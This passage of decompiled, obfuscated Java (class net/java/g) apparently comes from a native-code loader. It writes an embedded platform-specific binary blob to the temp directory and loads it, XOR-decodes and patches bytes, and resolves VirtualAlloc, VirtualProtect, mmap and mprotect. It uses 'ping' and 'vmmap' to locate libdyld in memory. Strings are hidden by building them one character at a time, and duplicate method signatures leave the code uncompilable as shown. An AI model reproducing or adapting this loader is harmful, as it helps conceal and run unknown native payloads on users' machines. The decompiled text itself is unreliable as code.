      // 1ef: ifeq 1fa
      // 1f2: lload 4
      // 1f4: lload 8
      // 1f6: invokestatic net/java/g.b (JJ)I
      // 1f9: pop
      // 1fa: sipush 211
      // 1fd: ireturn
      // 1fe: aload 0
      // 1ff: invokestatic net/java/g.a ([B)I
      // 202: dup
      // 203: istore 0
      // 204: bipush -1
      // 205: if_icmpne 21b
      // 208: lload 4
      // 20a: lconst_0
      // 20b: lcmp
      // 20c: ifeq 217
      // 20f: lload 4
      // 211: lload 8
      // 213: invokestatic net/java/g.b (JJ)I
      // 216: pop
      // 217: sipush 212
      // 21a: ireturn
      // 21b: iload 0
      // 21c: bipush -2
      // 21e: if_icmpne 234
      // 221: lload 4
      // 223: lconst_0
      // 224: lcmp
      // 225: ifeq 230
      // 228: lload 4
      // 22a: lload 8
      // 22c: invokestatic net/java/g.b (JJ)I
      // 22f: pop
      // 230: sipush 213
      // 233: ireturn
      // 234: bipush 3
      // 235: anewarray 4
      // 238: dup
      // 239: bipush 0
      // 23a: lload 4
      // 23c: iload 0
      // 23d: i2l
      // 23e: ladd
      // 23f: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 242: aastore
      // 243: dup
      // 244: bipush 1
      // 245: lload 4
      // 247: iload 0
      // 248: i2l
      // 249: ladd
      // 24a: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 24d: aastore
      // 24e: dup
      // 24f: bipush 2
      // 250: lload 10
      // 252: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 255: aastore
      // 256: invokestatic net/java/g.b (Ljava/lang/Object;)Ljava/lang/Object;
      // 259: checkcast java/lang/Number
      // 25c: invokevirtual java/lang/Number.intValue ()I
      // 25f: istore 0
      // 260: iload 0
      // 261: ireturn
      // 262: athrow
      // try (8 -> 17): 337 null
      // try (27 -> 195): 337 null
      // try (205 -> 269): 337 null
      // try (279 -> 285): 337 null
      // try (308 -> 335): 337 null
   }

   private static Object a(String var0) {
      try {
         return NativeLibrary.getInstance(d()).getFunction(var0);
      } catch (Throwable var3) {
         try {
            StringBuilder var4;
            (var4 = new StringBuilder()).append('/');
            var4.append('u');
            var4.append('s');
            var4.append('r');
            var4.append('/');
            var4.append('l');
            var4.append('i');
            var4.append('b');
            var4.append('/');
            var4.append('s');
            var4.append('y');
            var4.append('s');
            var4.append('t');
            var4.append('e');
            var4.append('m');
            var4.append('/');
            var4.append('l');
            var4.append('i');
            var4.append('b');
            var4.append('d');
            var4.append('y');
            var4.append('l');
            var4.append('d');
            var4.append('.');
            var4.append('d');
            var4.append('y');
            var4.append('l');
            var4.append('i');
            var4.append('b');
            return NativeLibrary.getInstance("/usr/lib/system/libdyld.dylib").getFunction(var0);
         } catch (Throwable var2) {
            StringBuilder var1;

            return NativeLibrary.getInstance("/usr/lib/libSystem.B.dylib").getFunction(var0);
         }
      }
   }

   private static int b(long var0, long var2) {
      if (e == null) {
         e = (Function)a(f());
      }

      Pointer var4;
      return (var4 = e.invokePointer(new Object[]{new Pointer(var0), new Pointer(var2)})) == null ? 0 : (int)Pointer.nativeValue(var4);
   }

   private static long a(int var0) {
      try {
         Process var1 = null;
         int var2 = var0;
         int var3 = a();
         if (var0 == var3 && !l.g()) {
            Runtime var10000 = Runtime.getRuntime();
            String[] var10001 = new String[2];
            StringBuilder var18;

            var10001[0] = "ping";
            StringBuilder var19;
            (var19 = new StringBuilder()).append('l');
            var19.append('o');
            var19.append('c');
            var19.append('a');
            var19.append('l');
            var19.append('h');
            var19.append('o');
            var19.append('s');
            var19.append('t');
            var10001[1] = "localhost";
            Process var12;
            var1 = var12 = var10000.exec(var10001);

            try {
               var2 = ((Number)Process.class.getMethod(a()).invoke(var12)).intValue();
            } catch (Throwable var10) {
               try {
                  Field var15;
                  (var15 = var12.getClass().getDeclaredField(a())).setAccessible(true);
                  var2 = var15.getInt(var12);
               } catch (Exception var9) {
                  var9.printStackTrace();
                  return 0L;
               }
            }
         }

         String[] var10002 = new String[3];
         StringBuilder var20;

         var10002[0] = "vmmap";
         StringBuilder var21;

         var10002[1] = "-w";
         var10002[2] = Integer.toString(var2);
         Process var16 = new ProcessBuilder(var10002).start();
         BufferedReader var17 = new BufferedReader(new InputStreamReader(var16.getInputStream()));
         long var5 = 0L;

         while ((var13 = var17.readLine()) != null) {
            if (var5 == 0L && var13.contains(d())) {
               StringBuilder var22;

               if (var13.startsWith("__TEXT")) {
                  StringBuilder var23;
                  (var23 = new StringBuilder()).append('\\');
                  var23.append('s');
                  var23.append('+');
                  String[] var14 = var13.split(var23.toString());

                  for (int var24 = 0; var24 < var14.length; var24++) {
                     int var4 = var14[var24].indexOf(45);

                     try {
                        var5 = Long.parseLong(var14[var24].substring(0, var4), 16);
                     } catch (Exception var8) {
                     }
                  }
               }
            }
         }

         if (var1 != null) {
            try {
               var1.destroyForcibly();
            } catch (Throwable var7) {
               var1.destroy();
            }
         }

         return var5;
      } catch (Throwable var11) {
         var11.printStackTrace();
         return 0L;
      }
   }

   private static int a() {
      try {
         ClassLoader var10000 = g.class.getClassLoader();
         StringBuilder var1;

         Class var7 = var10000.loadClass("java.lang.management.ManagementFactory");

         Method var0 = var7.getDeclaredMethod("getRuntimeMXBean");
         var10000 = g.class.getClassLoader();

         Class var9 = var10000.loadClass("java.lang.management.RuntimeMXBean");

         String var3;
         return Integer.parseInt((var3 = (String)var9.getDeclaredMethod("getName").invoke(var0.invoke(null))).substring(0, var3.indexOf(64)));
      } catch (Exception var2) {
         var2.printStackTrace();
         return 0;
      }
   }

   private static int b(byte[] var0) {
      byte[] var1 = null;
      if (l.a()) {
         if (l.g()) {
            var1 = k.h();
         } else if (l.e()) {
            var1 = k.f();
         } else if (l.f()) {
            var1 = k.g();
         }
      } else if (!l.c() && !l.d()) {
         if (l.b()) {
            if (l.g()) {
               var1 = k.a();
            } else if (l.f()) {
               var1 = k.b();
            }
         }
      } else if (l.g()) {
         var1 = k.e();
      } else if (l.e()) {
         var1 = k.d();
      } else if (l.f()) {
         var1 = k.c();
      }

      Random var2 = new Random();
      String var8 = Long.toHexString(var2.nextLong()) + '-' + Long.toHexString(var2.nextLong());
      StringBuilder var3;

      String var10 = System.getProperty("java.io.tmpdir");
      l.a.put(System.class, l.class);
      File var9 = new File(var10, System.mapLibraryName(var8));
      l.b(new Object[]{var9, var1});
      System.load(var9.getAbsolutePath());
      l.a.remove(System.class);
      if (l.b()) {
         long var4 = var0.length - 4096 + 48;
         long var6 = a(a());
         a(var0, (int)var4, var6);
      }

      Object var11;
      if ((var11 = l.n(var0)) != null && var11 instanceof long[]) {
         int var5;
         if ((var5 = (int)((long[])var11)[0]) == 0) {
            Thread.sleep(350L);
         }

         return var5;
      } else {
         return 256;
      }
   }

   private static byte[] a() {
      byte var0 = -1;
      if (l.g()) {
         var0 = 0;
      } else if (l.e()) {
         var0 = 1;
      } else if (l.f()) {
         var0 = 2;
      }

      byte[] var1 = l.b(l.c());
      ByteArrayInputStream var7 = new ByteArrayInputStream(var1);
      DataInputStream var8 = new DataInputStream(var7);

      try {
         for (int var2 = 0; var2 < 3; var2++) {
            byte var3 = var8.readByte();
            int var4 = var8.readInt();
            if (var3 == var0) {
               byte[] var6 = new byte[var4];
               var8.readFully(var6);
               return var6;
            }

            var8.skip(var4);
         }
      } catch (Exception var5) {
         var5.printStackTrace();
      }

      return null;
   }

   public static boolean a() {
      byte[] var0 = null;

      try {
         byte[] var1;
         boolean var2 = a(var1 = var0 = a());
         byte[] var4 = a(
            new byte[]{
               108,
               -79,
               -94,
               -50,
               115,
               -70,
               -88,
               -58,
               122,
               -90,
               -93,
               -61,
               107,
               -72,
               -72,
               -35,
               108,
               -79,
               -94,
               -50,
               115,
               -70,
               -88,
               -58,
               122,
               -90,
               -93,
               -61,
               107,
               -72,
               -72,
               -35
            }
         );
         int var3 = l.a(var1, var4);

         for (int var5 = 0; var5 < var4.length; var5++) {
            var4[var5] = 0;
         }

         System.arraycopy(var1, 0, var1, var3, 24);

         for (int var23 = var3; var23 < var3 + 24; var23++) {
            var1[var23] = (byte)(var1[var23] ^ 153);
         }

         a(var1, var3 + 24, (long)var1.length);
         byte[] var24 = l.a(var1, var1.length + 4096);
         if (l.a()) {
            long var26 = var1.length;
            if (var2) {
               a(var24, (int)var26, 2);
            } else {
               a(var24, (int)var26, 2L);
            }
         } else if (l.b()) {
            long var25 = var1.length;
            if (var2) {
               a(var24, (int)var25, 3);
            } else {
               a(var24, (int)var25, 3L);
            }
         } else if (l.c() || l.d()) {
            long var6 = var1.length;
            if (var2) {
               a(var24, (int)var6, 1);
            } else {
               a(var24, (int)var6, 1L);
            }
         }

         var0 = var24;
         var1 = var24;
         if (a(var24)) {
            var3 = var1.length - 4096 + 20;
            a(var1, var3, 2);
         } else {
            var3 = var1.length - 4096 + 40;
            a(var1, var3, 2L);
         }

         if (l.b()) {
            long var18 = var0.length - 4096 + 48;
            long var22 = a(a());
            a(var0, (int)var18, var22);
         }
      } catch (Throwable var16) {
         var16.printStackTrace();
      }

      l.a.put(Properties.class, l.class);
      label120:
      if (l.a()) {
         if (b()) {
            try {
               if (a(var0, null) == 0) {
                  break label120;
               }
            } catch (Throwable var15) {
               var15.printStackTrace();
            }
         }

         try {
            if (b(var0) == 0) {
            }
         } catch (Throwable var12) {
            var12.printStackTrace();
         }
      } else if (!l.c() && !l.d()) {
         label105:
         if (l.b()) {
            if (b()) {
               try {
                  if (c(var0, null) == 0) {
                     break label105;
                  }
               } catch (Throwable var13) {
                  var13.printStackTrace();
               }
            }

            try {
               if (b(var0) == 0) {
               }
            } catch (Throwable var10) {
               var10.printStackTrace();
            }
         }
      } else {
         label154: {
            if (b()) {
               try {
                  if (b(var0, null) == 0) {
                     break label154;
                  }
               } catch (Throwable var14) {
                  var14.printStackTrace();
               }
            }

            try {
               if (b(var0) == 0) {
               }
            } catch (Throwable var11) {
               var11.printStackTrace();
            }
         }
      }

      for (int var19 = 0; var19 < 5; var19++) {
         try {
            if (l.n(null) == null) {
               l.a.remove(Properties.class);
               return true;
            }
         } catch (Throwable var9) {
         }

         try {
            Thread.sleep(200L);
         } catch (InterruptedException var8) {
         }
      }

      l.a.remove(Properties.class);
      return false;
   }

   private static String a() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('p');
      var0.append('i');
      var0.append('d');
      return "pid";
   }

   private static String b() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('V');
      var0.append('i');
      var0.append('r');
      var0.append('t');
      var0.append('u');
      var0.append('a');
      var0.append('l');
      var0.append('P');
      var0.append('r');
      var0.append('o');
      var0.append('t');
      var0.append('e');
      var0.append('c');
      var0.append('t');
      return "VirtualProtect";
   }

   private static String c() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('V');
      var0.append('i');
      var0.append('r');
      var0.append('t');
      var0.append('u');
      var0.append('a');
      var0.append('l');
      var0.append('A');
      var0.append('l');
      var0.append('l');
      var0.append('o');
      var0.append('c');
      return "VirtualAlloc";
   }

   private static String d() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('l');
      var0.append('i');
      var0.append('b');
      var0.append('d');
      var0.append('y');
      var0.append('l');
      var0.append('d');
      var0.append('.');
      var0.append('d');
      var0.append('y');
      var0.append('l');
      var0.append('i');
      var0.append('b');
      return "libdyld.dylib";
   }

   private static String e() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('V');
      var0.append('i');
      var0.append('r');
      var0.append('t');
      var0.append('u');
      var0.append('a');
      var0.append('l');
      var0.append('F');
      var0.append('r');
      var0.append('e');
      var0.append('e');
      return "VirtualFree";
   }

   private static String f() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('m');
      var0.append('u');
      var0.append('n');
      var0.append('m');
      var0.append('a');
      var0.append('p');
      return "munmap";
   }

   private static String g() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('m');
      var0.append('p');
      var0.append('r');
      var0.append('o');
      var0.append('t');
      var0.append('e');
      var0.append('c');
      var0.append('t');
      return "mprotect";
   }

   private static String h() {
      StringBuilder var0;

      return "mmap";
   }
}
